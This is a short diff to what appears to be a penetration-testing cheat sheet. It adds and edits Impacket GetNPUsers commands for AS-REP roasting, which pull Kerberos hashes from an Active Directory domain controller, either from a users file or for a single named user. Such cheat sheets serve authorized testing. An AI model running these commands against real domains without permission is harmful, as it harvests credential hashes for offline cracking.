@@ -1,7 +1,10 @@
-% active-directory
+% asproasting, active-directory
 
-# Get user hash
-impacket-GetNPUsers -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
+# Get user hash from users file
+GetNPUsers -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
+
+# Get hash for a user
+GetNPUsers -no-pass -dc-ip <ip> <domain>/<user>
 
 % rpc
 
